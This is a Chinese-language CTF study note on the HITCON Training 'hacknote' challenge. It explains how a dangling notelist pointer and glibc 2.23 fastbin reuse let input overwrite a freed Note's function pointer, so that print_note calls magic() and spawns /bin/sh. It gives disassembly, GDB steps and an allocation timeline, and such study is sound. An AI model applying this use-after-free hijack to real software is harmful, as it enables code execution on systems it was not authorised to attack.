---
tags:
  - pwn
  - heap
  - uaf
  - function-pointer
  - i386
  - hitcon-training
created: 2026-10-22
updated: 2026-11-12
status: 静态已核验；本地动态 GDB 待测
---

# HackNote：HITCON Training 本地附件的 32 位 UAF 与函数指针

> **一句话：** 这题的根因不是“`free` 后内存还在”，而是程序释放 `Note` 后仍把旧地址留在 `notelist[i]`；后续若同一块地址被新的可控内容复用，`print` 会把那几个新字节误当成旧 `Note` 的函数指针并进行间接调用。

> [!note] 题解中的“旧指针”指什么
> 本题描述的是已编译 i386 ELF 的机器行为：删除路径没有把数组槽写为零，之后的机器指令仍可能从槽位加载旧地址位模式。按 C11 语言语义，对象生命周期结束后，指向它的指针值变为不确定；题解中的 UAF 是对目标二进制实际执行路径的分析，不是可移植 C 代码可以依赖的行为。

> [!warning] 本页的证据边界
> 2026-10-22 已对本地附件 `hacknote` 做静态核验：它是 i386、非 PIE 的 ELF；`add_note` 有两次 `malloc`，`del_note` 按“内容 → Note”顺序 `free` 但不清 `notelist`，`print_note` 在 `0x0804893a` 间接 `call eax`，`magic` 在 `0x08048945` 调用 `system("/bin/sh")`。这**不等于**已在你的 VM 上完成本轮 GDB 复现，也不代表远程服务的 libc 或地址已经确认。下文的 fastbin 复用顺序只适用于题库提供的 i386 glibc 2.23 兼容运行树，仍需用本地运行时快照核对。

> 本地附件目录 README 将它标为 HITCON Training 的 `hacknote`。它与题单里的 pwnable.tw 同名题可能共享题型，但不要据此认定附件、Build ID 或远程环境完全相同；本页地址只对应本地这份 ELF。

> [!note] 关联
> `UAF详解` · `堆利用基础` · `C语言内存与指针` · `C语言结构体与二级指针` · `C语言函数` · `IDA使用指南` · `GDB与Pwndbg入门#Pwndbg 界面怎么读` · `malloc与free内存变化观察实验` · `堆版本验证清单模板` · `2026-10-22-hacknote-静态审查与UAF链条` · `堆题目与WP索引`

## 外部资料对照：学对象关系，不搬地址

[CTF Wiki 的 UAF/HackNote 讲解](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/use-after-free/)与本页使用的是同一类题目模型：一条 Note 有函数指针和内容指针；删除时先释放 content、再释放 Note，但旧索引仍保留；打印时从 Note 起始处取函数指针并间接调用。它适合帮助你把“悬空引用为什么会变成调用候选”串起来。

但 CTF Wiki 展示的是它自己的编译样本，不是本地附件的逐字复刻。它的示例脚本使用不同的申请/删除顺序，`magic` 地址也与本地附件静态核验出的 `0x08048945` 不同；因此示例里的索引、分配大小、堆地址、寄存器快照和保护结论都不能直接复制。本地链条以本页第 6–7 节和本地 ELF 为准，外部文章只用于核对对象关系与控制流。

还要分清两个容易混在一起的词：本地脚本按不同槽位各删除一次，利用的是**悬空 Note 引用 + fastbin 同尺寸块的 LIFO 复用**；它不是“同一块被 `free` 两次”的 double-free，也不是 how2heap 的 `fastbin_dup`。`fastbin_dup` 可以作为对照实验学习重复释放检查和 freelist 状态，但不能把它的触发条件当成本题漏洞条件。最终仍要在 VM 中用 `free` 参数和后续 `malloc` 返回值确认实际复用顺序。

[QA210 的 pwnable.tw HackNote 题解](https://yuri08-qa210.github.io/pwnable.tw/hacknote/index.html) 是另一份可读的完整案例：页面包含 checksec、结构体、add/delete/print 逻辑、GDB 堆图和 pwntools EXP。它的样本是 i386、NX 开、Canary found、No PIE；文中把函数指针改到 `system` 后，还解释了 `print_func(note)` 会把 Note 地址作为第一个参数，所以需要让该地址处的字节能组成命令。这个讲法适合学习“间接调用的实参从哪里来”。

这份题解与本页本地附件不应混为同一份二进制：菜单编号、删除/打印索引、函数地址、对象布局细节、输入长度、libc 与最终命令都要重新核对。特别是 QA210 页面描述的 `system(note_ptr)` 技巧依赖它自己的对象布局和命令字节安排，不能直接替换本页 `magic` 路线。阅读时重点对照调用点：函数指针的值从哪里读、`note` 指针作为参数如何传入、`system` 将它当作什么字符串。

### 这几份外部资料各自看什么

| 资料 | 建议阅读位置 | 能补什么 | 不要照搬什么 |
|---|---|---|---|
| [CTF Wiki：Use After Free](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/use-after-free/) | HackNote 的 `print_note`、`delete_note`、利用分析 | 旧索引仍可达、旧对象字段如何被新内容覆盖、间接调用怎样消费字段 | 其 ELF 地址、堆地址、菜单顺序、chunk 输出和保护信息 |
| [HITCON Training：LAB/lab10](https://github.com/scwuaptx/HITCON-Training/tree/master/LAB/lab10) | `hacknote.c`、`hacknote.py` 与 Makefile | 原始训练题目录及源码/脚本的对应关系 | 不要仅凭同名就假定它与本地附件 Build ID、编译选项完全相同 |
| [how2heap：`first_fit.c`](https://github.com/shellphish/how2heap/blob/master/first_fit.c)；[glibc 2.23 `fastbin_dup.c`](https://github.com/shellphish/how2heap/blob/master/glibc_2.23/fastbin_dup.c) | 先看 `first_fit.c` 的 free→较小 malloc→同址复用；再看 2.23 `fastbin_dup.c` 的源码注释 | 前者用较大的非 fastbin 分配说明“新 malloc 可能复用已释放空间”；后者展示 fastbin 中单独的重复释放场景 | `first_fit.c` 的分配器路径和尺寸与本题不同，不是 HackNote 的 fastbin 证据；`fastbin_dup.c` 也不是本题漏洞条件。二者都不能替代本题 GDB 地址记录 |
| [Dhaval Kapil：Heap Exploitation](https://heap-exploitation.dhavalkapil.com/) | [Bins and Chunks](https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/bins_chunks)、[Core Functions](https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/core_functions)、[Double Free](https://heap-exploitation.dhavalkapil.com/attacks/double_free) | 分别补 bins/chunk 结构、`malloc/free` 决策路径、fastbin 重复释放的示例链 | 书中示例有自己的历史架构与 glibc 条件；Double Free 页讲的是重复 `free`，不是本题 UAF |

### CTF Wiki / HITCON 源码：把 UAF 因果链逐句读出来

CTF Wiki 这页选用 HITCON Training 的 HackNote。它与本地附件属于同一种程序模型，但页面实际展示的是它自己的源码和 ELF。上游源码里，`struct note` 有两个 32 位字段：偏移 `+0` 是 `printnote` 函数指针，偏移 `+4` 是 `content` 指针；`add_note` 先申请结构体，再申请内容并读入用户数据。[HITCON `hacknote.c`：结构体与 add](https://github.com/scwuaptx/HITCON-Training/blob/master/LAB/lab10/hacknote.c#L444-L515)

这就像一个目录项指向一张卡片，卡片再指向文字内容：

```text
notelist[i] ──► Note
                 +0  printnote 函数地址
                 +4  content 地址 ──► 用户输入
```

`del_note` 先 `free(notelist[idx]->content)`，再 `free(notelist[idx])`，但没有执行 `notelist[idx] = NULL`。因此，释放动作归还的是两个堆对象；数组槽没有被清理。对这份已编译程序而言，后续 `print_note` 仍会从槽位取出旧地址，并尝试访问它。[HITCON `delete` 与 `print`](https://github.com/scwuaptx/HITCON-Training/blob/master/LAB/lab10/hacknote.c#L525-L582)

打印路径的关键不是普通 `puts`，而是：

```c
if (notelist[idx])
    notelist[idx]->printnote(notelist[idx]);
```

CPU 会先从旧 Note 地址的 `+0` 读出 4 字节，作为目标函数地址，然后间接调用它。只要新分配的、受输入控制的内容恰好复用了旧 Note 的地址，输入的前 4 字节就可能被旧打印路径当作函数指针。漏洞链因此是：

```text
删除：旧 Note 被 free，但 notelist[i] 仍留着旧地址
  ↓
重新分配：allocator 把同一地址交给新对象
  ↓
写入：新对象的开头由用户输入控制
  ↓
打印：旧槽仍把这段内存解释为 Note，读取 +0 并间接调用
```

CTF Wiki 页面正文把两条 Note 的内容大小写成 16 字节，但同页给出的 EXP 实际调用 `addnote(32, ...)`；两者都让旧内容块与 8 字节 Note 进入不同的 fastbin 大小类。下面按**网页所附 EXP**说明：它依次新增 Note 0、Note 1（内容请求 32），删除 0、再删除 1，最后新增 Note 2（内容请求 8），并打印旧索引 0。Note 结构体请求 8 字节，在该样例的 i386 glibc 环境中落入 `0x10` fastbin；删除后这一类里 Note 对象按释放顺序形成 `N1 → N0`。新增 Note 2 时，第一笔 `malloc(8)` 取回 N1；第二笔内容 `malloc(8)` 再取回 N0。于是 `p32(magic)` 写到 N0 的开头，也就是旧 `printnote` 字段的位置；旧索引 0 仍保留 N0 的地址，随后打印就会经函数指针间接调用。网页正文与脚本的 16/32 差异已在这里标出，复现时应以你实际运行的脚本与 allocator 现场为准。[CTF Wiki 的利用分析与 EXP](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/use-after-free/)

这里最需要手算的是**分配顺序和大小类别**，不是照着文章背索引：每次 `add` 都先申请 Note、后申请 content；每次 `delete` 都先释放 content、后释放 Note。小块链表按最近释放优先取出，所以“谁先复用”由完整时间线决定。CTF Wiki 的地址、`magic` 地址 `0x08048986`、输入菜单次序和 GEF 输出只属于它展示的样本。该网页正文与 EXP 的内容请求大小分别写作 16 和 32；本段的具体时间线以网页 EXP 的 32、32、8 为准。它们的教学重点是大小类分离和释放顺序，不是某个数字本身。

### 先分清用户指针与 chunk 头地址（i386 glibc 2.23）

在 32 位 glibc 的常见 chunk 布局中，chunk 头部有两个 4 字节字段：`prev_size` 和 `size`。`malloc()` 返回的用户指针通常位于头部之后 8 字节：

```text
N0 的 chunk header = 0x1000
  0x1000～0x1003  prev_size
  0x1004～0x1007  size
N0 的用户指针    = 0x1008
  0x1008          用户区起点；free 后也作为 fd 字段所在位置
```

所以，若题目或 GDB 告诉你 N0 的**用户指针**是 `0x1008`，那么它的 chunk 头地址是 `0x1000`。若 N1 用户指针是 `0x1018`，其 chunk 头地址就是 `0x1010`。在这类旧版 fastbin 中，N1 释放后，其用户区开头的 `fd` 保存的是**下一个 chunk 的 header 指针**，因此 N0 在 N1 后面时，N1 的 `fd` 数值是 `0x1000`，不是 N0 的用户指针 `0x1008`。

```text
逻辑链表（按对象名）：fastbin → N1 → N0 → NULL

N1 的用户区开头：
0x1018  fd = 0x1000 ─────► N0 的 chunk header
                            N0 的用户区从 0x1008 开始
```

这里有三种容易混淆的“地址”：`notelist[i]` 保存的是 Note 用户指针；`malloc` 返回值也是用户指针；fastbin 内部链接通常指向 chunk 头部。GDB 中可以对照：

```gdb
# 假设 n1 是 malloc 返回的 N1 用户指针，i386 头部大小为 8 字节
p/x n1
p/x (char *)n1 - 8
x/wx n1                 # free 后查看 fd 所在的首个 word
```

预期关系是 `header = user - 8`。但不要只凭 `bins` 的显示格式判断它打印的是哪种地址；检查目标架构、目标 libc，并把链表命令输出与原始内存字节对照。glibc 2.32 以后还要考虑 Safe-Linking 编码，本段的“直接存 header 指针”只适用于这里讨论的旧版 32 位环境。

### 对照 glibc 2.23 源码：header、`fd` 与 `malloc` 返回值

[glibc 2.23 的 `malloc.c`（带版本标签的源码镜像）](https://chromium.googlesource.com/native_client/nacl-glibc/+/glibc-2.23/malloc/malloc.c)把这两个地址转换写成了宏：`chunk2mem(p) = p + 2*SIZE_SZ`、`mem2chunk(mem) = mem - 2*SIZE_SZ`（源码约 1220–1223 行）。在 i386 中 `SIZE_SZ=4`，所以两字段头部共 8 字节：`malloc` 返回值比 chunk header 高 8 字节；反过来，`free` 从用户指针恢复 chunk 时会减 8。

#### 先看 `free` 入口：hook、空指针、header 转换

源码约 2937–2974 行的顺序可以翻译成：

```text
读取 __free_hook
  ├─ hook 非空：调用 hook(mem, 返回地址)，然后返回
  └─ hook 为空：继续
       ├─ mem == NULL：直接返回
       └─ mem 非空：p = mem2chunk(mem)，再交给 allocator 释放
```

这把三个概念连起来了：`free` 的参数 `mem` 是用户指针；`mem2chunk` 将它减去 `2*SIZE_SZ` 得到内部 chunk header；`_int_free` 后续操作的是这个 header。还有一个版本边界要记住：这份 glibc 2.23 源码里 hook 检查在 `mem == 0` 检查之前，所以 hook 被设置时，回调会先收到传入的 `mem`（即使它是 NULL）。平常未设置 hook 时，`free(NULL)` 会走空指针分支直接返回。不要把这个旧 hook 的调用顺序推广成所有 libc 版本的规则。

源码里的 fastbin `free` 路径（约 3885–3952 行）把 `p` 当作 chunk header。关键注释和赋值是：`p->fd = old`，随后把 fastbin 表头更新为 `p`。因此若先释放 N0，再释放 N1：

```text
释放 N0：fastbin 表头 = N0.header
释放 N1：N1.header->fd = N0.header
         fastbin 表头 = N1.header

逻辑链：fastbin → N1.header → N0.header → NULL
```

`fd` 字段在 chunk 结构中的偏移是 `2*SIZE_SZ`，也就是 i386 下 header 后 8 字节；这恰好是 `malloc` 返回的用户区起点。因此，N1 释放后，`x/wx N1_user` 看到的就是它的 `fd`。**字段存放在 N1 的用户区，不代表它保存的值也是用户指针**：保存值是下一个 chunk 的 header。

对应的 `malloc` fastbin 快路径（约 3372–3397 行）先取表头 `victim = *fb`，再把表头更新为 `victim->fd`，最后通过 `chunk2mem(victim)` 返回用户指针。于是先后两次 `malloc(8)` 的结果是：第一次拿到 N1 的用户区，第二次拿到 N0 的用户区。它解释的是“表头插入、表头取出”的 LIFO 顺序；实际题目仍要核实大小类、分配顺序和运行时 libc。

源码还显示 glibc 2.23 的 fastbin 重复释放检查主要拒绝“待释放块已经是该 fastbin 表头”的情形（约 3937–3942 行）。这不是现代版本的通用规则，也不是对整条链表做完整重复项扫描；不要据此推导其他 glibc 版本的 double-free 检查行为。这里的 HackNote 复用链本身是不同对象的释放与再分配，不应误称为 double-free。

> [!note] 源码版本边界
> 上面的源码来自 `native_client/nacl-glibc` 仓库中标记为 `glibc-2.23` 的代码镜像。它适合逐行理解旧版实现；精确分析某个题目时，仍要以附件 libc 的 Build ID、实际加载映射和对应版本源码为准，不能仅凭同叫 `libc.so.6` 就认定实现完全相同。

上游 HITCON 源码的 `magic()` 执行 `system("cat /home/hacknote/flag")`；本地附件静态分析到的 `magic` 则执行 `system("/bin/sh")`，其地址是 `0x08048945`。这也是同题型不同编译产物的直接例子：可以迁移“旧函数指针被新输入覆盖”的因果关系，不能迁移函数地址或最终命令。[HITCON `magic`](https://github.com/scwuaptx/HITCON-Training/blob/master/LAB/lab10/hacknote.c#L584-L588)

> [!note] C 语言层面的边界
> `free` 后继续通过旧指针访问，在 C 语言抽象机中属于未定义行为；此处讨论的是题目 ELF 的实际机器指令和 allocator 行为。GDB 看到数组槽里还留着地址位模式，不会让已释放的 C 对象重新变成有效对象。题解是在分析漏洞，不能把这种写法当成正常 C 程序的合法用法。

### how2heap：两个名字相近、性质不同的实验

[`first_fit.c`](https://github.com/shellphish/how2heap/blob/master/first_fit.c#L267-L315) 开头就明确说明它展示 allocator 的复用性质，不是在演示攻击。代码申请 A（`0x512`）和 B（`0x256`），把 A 写成 `this is A!`，释放 A，再申请较小的 C（`0x500`）并写成 `this is C!`；示例中 C 使用了可满足请求的空闲空间，随后通过旧变量 `a` 打印出新内容。它用来建立“释放后空间可被重用”的直觉，不是所有请求大小或 allocator 状态下都能保证同样结果。这里申请的是较大的非 fastbin 块，观察重点是“空间复用”，不是 HackNote 中 fastbin 的头插/取头顺序。

这个实验只证明“释放块可能被后续分配复用”。它没有重复 `free(a)`，也没有操纵函数指针，因此不能单独叫 double-free 或 fastbin dup。代码继续通过已释放的 `a` 读取内存，是为了展示物理地址复用；按 C 语言规则，这种读取不是合法程序行为。

[`glibc_2.23/fastbin_dup.c`](https://github.com/shellphish/how2heap/blob/master/glibc_2.23/fastbin_dup.c#L273-L322) 才是重复释放对照：先申请 A、B、C，再按 `free(A) → free(B) → free(A)` 操作。若立刻再次 `free(A)`，A 仍在 fastbin 表头，旧版本检查会拒绝；中间释放 B 后，A 不再是表头，再次释放 A 会形成 `A → B → A` 的链。连续申请三次，样例断言第一和第三次拿到同一地址。

| 现象 | HackNote 本地脚本 | `first_fit.c` | `fastbin_dup.c` |
|---|---|---|---|
| 是否重复释放同一块 | 否；删除两个不同索引，各释放一次 | 否；A 释放一次 | 是；A 被释放两次，中间穿插 B |
| 主要说明 | 悬空 Note 引用如何因地址复用而被误解释 | allocator 如何把空闲空间交给后续申请 | fastbin 链表重复节点如何造成同址多次分配 |
| 是否能直接证明本题现场 | 需要本地 GDB 记录 | 不能，尺寸与链路不同 | 不能，漏洞条件不同 |

### Dhaval Kapil：读它时要带着问题

[《Heap Exploitation》前言](https://heap-exploitation.dhavalkapil.com/)说明，这本在线书先讲 glibc `malloc/free` 和堆内部，再讲经典攻击；它面向初学者，适合在代码看不明白时补 allocator 背景。建议按三篇的作用来读：

- [Bins and Chunks](https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/bins_chunks)：先看“空闲块按什么结构保存”。文中把 fastbin 说成单链表、从表头插入/取出（LIFO），把 unsorted bin 作为空闲块的中转区；这是帮助建立结构直觉的历史说明，具体尺寸和规则要看题目的架构与 libc。
- [Core Functions](https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/core_functions)：把 `malloc` 理解成逐级寻找可用块，把 `free` 理解成检查大小、选择 bin 或合并。读这页时不要试图一次记下全部分支，只追踪本题的小块是否走 fastbin，以及分配器从哪里取表头。
- [Double Free](https://heap-exploitation.dhavalkapil.com/attacks/double_free)：展示 `free(A) → free(B) → free(A)` 如何避开旧版 fasttop 检查并形成重复链，再由多次 `malloc` 让两个指针拿到同一地址。它用于对照“重复释放”，而 HackNote 当前漏洞是旧引用仍可达、不同对象释放后发生地址复用；不能把两者叫成同一个漏洞。

读到 chunk、bins、分配与释放时，把每个概念对应回本题的具体问题：请求大小如何变成 chunk 类别？释放后用户区何时被链表元数据占用？哪次申请可能拿回旧地址？

不要把书中示例的链表布局、分配地址和攻击步骤当成本题事实。该书说明内容持续更新，且不同章节的经典利用有自己的历史环境；HackNote 的最终依据仍是本附件、配套 i386 glibc 2.23 运行树和 GDB 实际观察。

#### 看完外链后，用这四句话复述

1. `delete` 释放了哪两个对象，旧索引有没有被清空？
2. 新 `malloc` 返回了哪个旧地址，大小类别为什么匹配？
3. 用户输入的第一个 4 字节覆盖了旧对象的哪个字段？
4. `print` 哪条间接调用指令消费了这个字段？

这四项都能由源码或本地 GDB 证实时，才把“利用链已验证”写进 Research Log；看懂公开 WP 本身不算动态验收。

推荐阅读顺序：先看本地反汇编与对象图 → 用 CTF Wiki 对照“悬空引用到间接调用”的因果链 → 用 HITCON 源码确认训练题上下文 → 用 how2heap 做独立 allocator 对照 → 需要补 allocator 背景时再读 Dhaval。看完后应能自己回答：哪个旧槽仍可达、哪次分配复用了什么地址、输入覆盖了哪个字段、哪条指令消费该字段。地址相等、marker 匹配和 call 前寄存器现场仍需本地 GDB 证据。

---

## 1. 先给题目画像：不要先写 payload

| 项目 | 当前可从材料得到的判断 | 必须亲自核验 |
|---|---|---|
| 架构 | 已静态确认：ELF32 / Intel 80386；普通指针和函数地址均为 4 字节 | Linux VM 中再以 `file ./hacknote` 留档 |
| 装载与地址 | 已静态确认：ELF `EXEC`、代码含绝对地址，故为非 PIE；解释器为 `/lib/ld-linux.so.2` | 用匹配 loader 启动，GDB 中确认 mapping |
| 保护 | 静态段表显示 GNU_STACK 为 `rw-`（NX）；存在 GNU_RELRO、未见 `BIND_NOW`（Partial RELRO）；未见 `__stack_chk_fail` 导入（无 Canary 的静态线索） | 用目标 Linux 的 `checksec` 最终确认 |
| 程序模型 | 已静态确认：固定槽位笔记数组；每条笔记有“打印函数 + 内容指针”两层对象 | `add/delete/print` 的运行时指针值 |
| 漏洞 | 已静态确认：`del_note` 释放对象后没有写回 `notelist[i] = NULL` | 在两个 `free` 后查看全局槽位 |
| 风险动作 | 已静态确认：`print_note` 读取第一字段，并在 `0x0804893a` 执行 `call eax` | 断在 call 前，观察 `$eax` 与对象首 word |
| allocator 环境 | 题库提供 i386 glibc 2.23 兼容运行树；该版本没有 tcache，可用 fastbin 模型解释本脚本 | 记录实际 loader/libc 与 `bins`/chunk header |

“有 UAF”只是第一行。要形成控制流能力，还需要证明：旧对象可到达、地址确实被目标对象复用、可控字节覆盖到偏移 0 的函数指针字段，而且 `print` 真正消费该字段。

---

## 2. 把 IDA 伪代码还原成能读懂的 C

反编译里常见的：

```c
*((_DWORD *)&notelist + i)
*(_DWORD *)(note + 4)
```

先不要把它当成神秘语法。对 32 位程序，它通常可以还原成一个指针数组和结构体字段访问：

```c
typedef struct Note {
    void (*print_func)(struct Note *);  // 偏移 0，4 字节
    char *content;                      // 偏移 4，4 字节
} Note;

Note *notelist[5];
int count; // 原程序的累计计数；delete 不会把它减回去
```

`_DWORD` 的意思只是“这里有 4 字节”。它可能是整数、普通地址或函数地址；要由代码怎样使用它来定类型。第一个表达式可以按下面的顺序还原：

```text
&notelist                       取指针数组整体的起始地址
(_DWORD *)&notelist             把它按“每格 4 字节”看待
(_DWORD *)&notelist + i         向后移动 i × 4 字节
*((_DWORD *)&notelist + i)      读取这个 4 字节槽位，即 notelist[i]
```

为什么最后能对应 `notelist[i]`？因为这份附件是 i386，数组每个元素是 4 字节指针。若换成 64 位，不能继续把 `_DWORD` 当作指针宽度；要按目标架构重新识别类型和汇编。这些强制转换是读 IDA 伪代码的线索，不是推荐照抄进严格 C 源码的写法。

类似地，原伪代码 `*(_DWORD *)(v1 + 4)` 中，`v1` 是 IDA 推断出的整数地址临时变量，所以这里按数值地址加 4 字节，落在 `content` 字段。把类型还原成 C 的 `Note *n` 后，应写 `n->content`（取值）或 `&n->content`（字段地址）；不能把 `n + 4` 当作加 4 字节，因为 C 会按 `sizeof(*n)` 缩放指针步长。

在有符号的本地 GDB 会话里，可以用实际地址对照这层关系：

```gdb
p/x &notelist[0]
p/x &notelist[1]      # i386 下通常比前一个槽位地址大 4
p/x notelist[0]       # 槽位里保存的 Note 地址
x/2wx notelist[0]     # Note 的两个 4 字节字段：函数地址、content 地址
```

如果调试器提示没有 `notelist` 符号，就从 IDA/反汇编确认全局数组地址后再用 `x/5wx <数组地址>`；不要把“数组槽位地址”和“槽位里保存的 Note 地址”混为一谈。

典型的等价模型如下。它用于理解对象关系，**不是对原始源码逐字符的断言**：

```c
void add_note(size_t size) {
    // 原程序另有 count 相关检查；这里重点画对象分配和指针关系。
    int i = first_empty_slot();
    if (i < 0) return;

    Note *n = malloc(sizeof(*n)); // 32 位下请求 8 字节用户区
    notelist[i] = n;              // 原二进制在申请 Note 后就写入槽位
    if (n == NULL) exit(1);
    n->print_func = print_note_content;
    n->content = malloc(size);
    if (n->content == NULL) exit(1);
    read(0, n->content, size);
    count++; // 累计新增；delete 不会递减
}

void delete_note(int i) {
    // 此处省略原程序基于 count 的索引检查。
    Note *n = notelist[i];
    if (n == NULL) return;
    free(n->content);
    free(n);
    // 漏洞候选：缺少 notelist[i] = NULL;
}

void print_note(int i) {
    // 此处省略原程序基于 count 的索引检查。
    if (notelist[i] == NULL) return;
    notelist[i]->print_func(notelist[i]);
}
```

这段只展示对象和生命周期，不是原程序逐字复刻；它省略了提示输出、输入缓冲和 `count` 的具体边界判断。原附件在 `malloc(sizeof(*n))` 后先把返回值写入 `notelist[i]`，再初始化函数指针并申请内容；成功读入内容后才递增全局 `count`。`count` 随新增累积，删除时不递减，所以不能把它当成“当前还活着几条笔记”。`add_note` 会扫描 `notelist` 找空槽；释放时槽位没清空，因此本脚本两次删除后，第四次新增使用槽位 3。

这也说明两个状态不能混为一谈：`count` 是累计成功新增次数；`notelist[i]` 是否为空才决定该槽能否被扫描逻辑复用。反汇编在 `0x0804863f` 比较 `count` 与 `5`，并在 `count <= 5` 时继续，所以当累计值恰好为 5 时不会触发“Full”分支；若五个槽都非空，后续扫描找不到空槽会直接走到函数末尾，而不是一定打印 `Full`。这是状态/提示逻辑不一致，不会自动变成越界写；应把它和 UAF 的旧槽引用分开分析。

其中要分开两个问题：

1. `free(notelist[i])` 结束了 `Note` 对象的生命周期；它不会自动把**全局数组槽位**写成 `NULL`。
2. `notelist[i] != NULL` 只能证明槽位里还留着一个数值，不能证明这个数值仍指向有效 `Note`。

---

## 3. 一条笔记为什么有两次 `malloc`

`add` 并不是只申请“一块笔记内存”。它通常建立两个对象：管理结构 `Note` 与用户内容 `content`。

```text
notelist[0]
    │
    ▼
N0：Note 结构体（用户区请求 8 字节）
+0x00  print_func ───────────────► print_content
+0x04  content    ───────────────► C0

C0：用户输入的内容（请求大小由菜单给出）
+0x00  'A' 'A' 'A' ...
```

所以创建两条笔记，应该在时间线里写成四个对象，而不是笼统地写“申请了两个 chunk”：

```text
add(0, size0)  → N0, C0
add(1, size1)  → N1, C1
```

`N0/N1` 是结构体；`C0/C1` 是内容。两者的请求大小、chunk 类别、释放次序和复用目标都可能不同。后面判断“谁覆盖了谁”时，名称必须保留。

> [!tip] 32 位的 8 字节，不等于 chunk 总大小
> `sizeof(Note) == 8` 只说明这段用户数据需要放两个 4 字节字段。常见旧 32 位 glibc 中，`malloc(8)` 的 chunk 总跨度可能是 `0x10`；但这是待验证的 allocator 结果。先在 header 处看 raw `size`，不要从教程直接抄结论。

---

## 4. 漏洞发生的瞬间：对象结束了，引用没有结束

按你脚本中的 `delete(1)` 看：

```text
notelist[0] → N0 → C0
notelist[1] → N1 → C1
```

执行脚本里的 `delete(1)` 时，典型顺序是：

```text
free(C1)
free(N1)
notelist[1] 仍保存 N1 的旧数值   ← 生命周期错误
```

此刻不是“`N1` 仍是一条可用笔记”。更准确的图是：

```text
notelist[1] ─ ─ ─► [原 N1 地址：空闲 allocator 状态 / 之后可能被复用]
notelist[0] ──────► N0 → C0
```

`print(1)` 通过计数范围检查后，仍会把 `notelist[1]` 中非 NULL 的旧数值当成 `Note *`：

```text
读取 N1+0x00 这 4 字节
        ↓
把它当作函数地址
        ↓
间接 call
```

这就是 **UAF call 候选**。它和“打印旧字符串”的 UAF read 不一样：风险点是控制流间接调用，而不是 `puts` 读取字节。

---

## 5. 为什么“对象复用”会变得危险

旧分配器常按大小类别回收小块，并常以前插入后取出的方式复用空闲块。因此删除两条笔记后，后来创建的对象有可能落回旧对象地址。注意，这里的“有可能”需要用地址记录证实。

一个值得验证的假设是：选择合适的内容请求大小，使内容 chunk 的**实际 chunk 大小类别**和 `Note` 的类别一致。若 allocator 将某段旧 `Note` 用户区交给新的内容，新的内容前 4 字节就位于旧 `Note` 的 `print_func` 偏移处。这里用通用索引 `i` 和名字 `C_new` 表示，不代表本题脚本的具体编号：

```text
旧解释（N1）：
N1+0x00  [ print_func ]
N1+0x04  [ content    ]

复用后的新解释（C_new）：
C_new+0x00  [ 用户可控的前 4 字节 ]
C_new+0x04  [ 后续内容             ]
```

若随后仍通过旧 `notelist[i]` 执行对应的 `print(i)`，程序会把 `C_new+0x00` 的四个字节当作函数指针读取。这叫**类型混淆式对象复用**：同一段地址在不同时间被不同对象模型解释。本题脚本的具体对象是旧 `N1` 与新 `C3`，索引是 `1`。

但这里有四个不能跳过的前提：

| 前提 | 该怎么证明 |
|---|---|
| 删除路径真的 free 了 `N1` | 在 `free` 调用处记录传入地址，或用反汇编跟踪 |
| 新对象返回地址等于释放前保存的 N1 数值 | 在 `free` 前保存地址整数；比较新 `malloc` 返回值，不能解引用旧指针 |
| 新对象从偏移 0 开始受输入控制 | 记录 `read` 的目标、长度和输入截断规则 |
| print 真的从旧地址偏移 0 做间接 call | 查看目标函数指针读取指令和紧随其后的 `call eax` |

没有这四项，就只能说“思路候选”，不能说“控制流已可控”。

---

## 6. CPU 视角：这份附件实际执行了什么

这次不是泛化伪代码。附件的 `print_note` 在 i386 下已静态确认有如下关键指令：

```asm
0x0804891c  mov eax, 0x0804a048               ; eax = notelist 数组地址
0x08048922  mov edx, [ebp-0xc]                ; edx = index
0x08048925  mov eax, [eax+edx*4]              ; eax = notelist[index]（Note *）
0x08048928  mov eax, [eax]                    ; eax = Note.print_func
0x0804892a  mov edx, 0x0804a048               ; 重新取数组地址
0x08048930  mov ecx, [ebp-0xc]                ; ecx = index
0x08048933  mov edx, [edx+ecx*4]              ; edx = notelist[index]（Note *）
0x08048939  push edx                           ; 把 Note * 作为第一个实参
0x0804893a  call eax                           ; EIP 跳到 eax 指向的位置
```

执行前后可以这样读：

```text
执行到 `0x08048928` 前：`eax = N1`，内存 `[N1+0]` 是一个 4 字节值
`mov eax, [eax]` 后：`eax = [N1+0]`（候选函数地址）
执行到 `0x0804893a` 前：`edx = N1`，即将作为 `magic` 的参数压栈
`call eax`：CPU 将下一条指令地址压栈；`EIP ← eax`
```

所以 GDB 里最有价值的不是只看菜单，而是停在**间接 call 前一条**：

```gdb
# 这个附件是非 PIE；间接 call 的静态地址已核实
b *0x0804893a
run
info registers eax edx esp eip
x/2wx $edx
x/i $eip
si
info registers eip
```

你要回答：`$edx` 是否是旧 `N1` 数值？`x/2wx $edx` 的第一个 word 是否就是即将被拿去 call 的 `$eax`？单步后 `$eip` 是否进入 `magic`？

> [!note] 这份附件里的 `magic`
> `magic` 的反汇编没有读取它的第一个栈参数，而是直接把 `.rodata` 中的 `/bin/sh` 传给 `system@plt`。因此 `print_note` 压入的 `Note *` 不会影响这个本地目标函数；这仍然是该二进制的事实，不应推广为所有函数指针调用都可忽略参数。

### 6.1 你的脚本：为什么这组操作恰好复用了 `N1`

下面按题库提供的 **i386 glibc 2.23 本地兼容运行树**推导。它是针对本地复现的模型；远程环境是否同样没有 tcache、是否使用同一个 libc，必须另行核验。

先给每次 `add` 内部产生的两个对象命名：`N` 表示 8 字节的 `Note`，`C` 表示内容。32 位 glibc 2.23 常见的请求大小换算是：

```text
malloc(0x8)  → chunk size 0x10，raw size 通常是 0x11
malloc(0x18) → chunk size 0x20，raw size 通常是 0x21
```

你的前三次 `add` 形成的对象序列是：

```text
add(0x8,  ...)  # index 0：N0(0x10), C0(0x10)
add(0x8,  ...)  # index 1：N1(0x10), C1(0x10)
add(0x18, ...)  # index 2：N2(0x10), C2(0x20)
```

接下来两次删除的真实顺序是 `free(content)` 再 `free(Note)`：

```text
delete(1)
  0x10 fastbin：N1 → C1

delete(2)
  0x20 fastbin：C2
  0x10 fastbin：N2 → N1 → C1
```

`0x18` 的关键作用是让 `C2` 进入 `0x20` 类别。若它也申请 `0x8`，`C2` 会落进 `0x10` 链，后续两次同类分配取到的就不再是这里需要的 `N2`、`N1`。

